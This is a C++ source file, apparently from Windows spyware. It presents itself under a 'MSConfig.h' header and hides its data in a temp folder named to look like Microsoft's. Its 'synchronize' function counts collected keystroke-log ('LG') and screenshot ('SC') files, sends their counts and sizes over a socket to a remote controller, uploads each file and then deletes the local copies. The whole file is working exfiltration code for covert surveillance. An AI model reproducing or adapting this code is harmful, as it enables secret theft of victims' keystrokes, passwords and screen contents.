#include "MSConfig.h"

void synchronize(SOCKET& ConnectSocket)
{
     char command[1024], response[1024], temppath[1024], tbdl[1024];;
     int res, totalSize = 0;
     string totr;
     HANDLE hw;
     WIN32_FIND_DATA fd;
     
     GetTempPath(1024, temppath);
     strcat(temppath, "Microsoft_9021784367548932\\LG\\*");
     hw = FindFirstFile(temppath, &fd);
     if (hw == INVALID_HANDLE_VALUE) return;
     int LGcount = -2;
     do
     {
            LGcount ++;
            totalSize += fd.nFileSizeLow;
     } while ((FindNextFile(hw, &fd) != 0));
     
     GetTempPath(1024, temppath);
     strcat(temppath, "Microsoft_9021784367548932\\SC\\*");
     hw = FindFirstFile(temppath, &fd);
     if (hw == INVALID_HANDLE_VALUE) return;
     int SCcount = -2;
     do
     {
            SCcount ++;
            totalSize += fd.nFileSizeLow;
     } while ((FindNextFile(hw, &fd) != 0));

     sprintf(command, "%d+", LGcount);
     send(ConnectSocket, command, (int)strlen(command), 0);
     
     totr.clear();
     do
     {
                 res = recv(ConnectSocket, response, 1024, 0);
                 response[res] = '\0';
                 totr += response;
     } while (totr[totr.length() - 1] != '+');
     
     sprintf(command, "%d+", SCcount);
     send(ConnectSocket, command, (int)strlen(command), 0);
     
     totr.clear();
     do
     {
                 res = recv(ConnectSocket, response, 1024, 0);
                 response[res] = '\0';
                 totr += response;
     } while (totr[totr.length() - 1] != '+');
     if (totr == "NO+") return;
     
     sprintf(command, "%d+", totalSize);
     send(ConnectSocket, command, (int)strlen(command), 0);
     
     totr.clear();
     do
     {
                 res = recv(ConnectSocket, response, 1024, 0);
                 response[res] = '\0';
                 totr += response;
     } while (totr[totr.length() - 1] != '+');
     if (totr == "NO+") return;
     
     //transfer logs
     GetTempPath(1024, temppath);
     strcat(temppath, "Microsoft_9021784367548932\\LG\\*");
     hw = FindFirstFile(temppath, &fd);
     if (hw == INVALID_HANDLE_VALUE) return;
     int i;
     for (i = -1 ; i <= LGcount ; i ++)
     {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            {
                                      transfer(ConnectSocket, fd.cFileName, NULL, fd.nFileSizeLow, "LG");
                                      strcpy(tbdl, temppath);
                                      strcpy(tbdl + strlen(tbdl) - 1, fd.cFileName);
                                      DeleteFile(tbdl);
            }
            FindNextFile(hw, &fd);
     }
     
     //transfer screens
     GetTempPath(1024, temppath);
     strcat(temppath, "Microsoft_9021784367548932\\SC\\*");
     hw = FindFirstFile(temppath, &fd);
     if (hw == INVALID_HANDLE_VALUE) return;
     i;
     for (i = -1 ; i <= SCcount ; i ++)
     {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            {
                                      transfer(ConnectSocket, fd.cFileName, NULL, fd.nFileSizeLow, "SC");
                                      strcpy(tbdl, temppath);
                                      strcpy(tbdl + strlen(tbdl) - 1, fd.cFileName);
                                      DeleteFile(tbdl);
            }
            FindNextFile(hw, &fd);
     }
     
     return;
}
